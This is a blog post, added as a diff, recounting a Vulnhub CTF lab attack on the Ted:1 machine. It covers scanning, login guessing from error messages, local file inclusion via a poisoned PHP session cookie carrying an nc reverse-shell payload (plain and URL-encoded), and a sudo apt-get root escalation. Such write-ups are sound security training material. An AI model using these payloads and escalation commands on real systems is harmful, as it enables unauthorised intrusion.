@@ -1,0 +1,128 @@
+---
+layout: post
+title:  "Ted:1 Vulnhub Writeup"
+date:   2020-09-24 15:00:00 +0530
+categories: VulnHub CTF
+---
+Ted:1 is a machine in which I used Local File Inclusion Vulnerability to obtain shell access and then exploited the misconfigured sudo permissions to get root Access.
+
+## Scanning
+As always I started scanning with nmap
+
+```
+nmap -sV -sC 192.168.198.136
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-24 09:58 EDT
+Nmap scan report for 192.168.198.136
+Host is up (0.00077s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Login
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.37 seconds
+
+```
+Port 80 is the only opened port.
+## Web Enumeration
+Then I enumerated directories and files using gobuster
+
+```
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 192.168.198.136 -x html,php
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://192.168.198.136
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     html,php
+[+] Timeout:        10s
+===============================================================
+2020/09/24 09:58:18 Starting gobuster
+===============================================================
+/index.php (Status: 200)
+/home.php (Status: 302)
+/logout.php (Status: 302)
+/cookie.php (Status: 302)
+/authenticate.php (Status: 302)
+/server-status (Status: 403)
+===============================================================
+2020/09/24 09:59:06 Finished
+===============================================================
+```
+An intersting file is cookie.php , although it didn't help me to get a shell but it gave me a hint about using cookie with LFI to gain a shell.
+## Brute forcing
+I found a login form in index.php, So I tried SQLmap to test for SQL injection but the form isn't vulnerable to it. 
+Then, I started testing with inputs and error messages and it was fruitful. The error messages gave me hints about the the correct username and correct password then the correct hashing algorithm. You can see the diffrence below.
+
+### Username guessing 
+![Username](/assets/machines/vulnhub/ted/1.png)
+
+### Password guessing 
+![Password](/assets/machines/vulnhub/ted/2.png)
+
+### Hashing Algorithm guessing
+![Hash](/assets/machines/vulnhub/ted/3.png)
+
+The correct username is admin and the correct password is hash sha256 of word admin
+
+
+## Local File Inclusion
+When I typed /etc/passwd it retrived the conent of the file, so it's clearly a LFI vulnerability. 
+![Hash](/assets/machines/vulnhub/ted/4.png)
+
+
+
+After many attemps like reading /etc/shadow and Log poisoning via apache logs, I found a suspicous cookie. so I tried to change it's value and access /var/lib/php/sessions/sess_ via the browser and it worked !
+![Hash](/assets/machines/vulnhub/ted/5.png)
+
+Immediately  I changed the cookie value to 
+
+```
+<?php system("nc [ip] 9999 -e /bin/sh")?>
+```
+
+but Url encoded as 
+```
+%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%22%6e%63%20%39%39%39%39%20%5b%69%70%5d%20%2d%65%20%2f%62%69%6e%2f%73%68%22%29%3f%3e
+```
+and started listening in my machine and refreshed the page. I got a shell!
+```
+root@kali:/home/kali# nc -lvnp 9999
+listening on [any] 9999 ...
+connect to [192.168.198.137] from (UNKNOWN) [192.168.198.136] 57674
+whoami
+www-data
+```
+
+## Privilege Escalation
+I ran sudo -l and noticed that I can run apt-get as a root without password (SUDO).
+
+```
+sudo -l
+Matching Defaults entries for www-data on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on ubuntu:
+    (root) NOPASSWD: /usr/bin/apt-get
+
+```
+
+So imediatly I went to https://gtfobins.github.io/ and got the following command
+which abuses the sudo priv given to the binary apt-get 
+
+```
+sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+whoami
+root
+```
+and voila here is the root privilege!
+
+
+
+
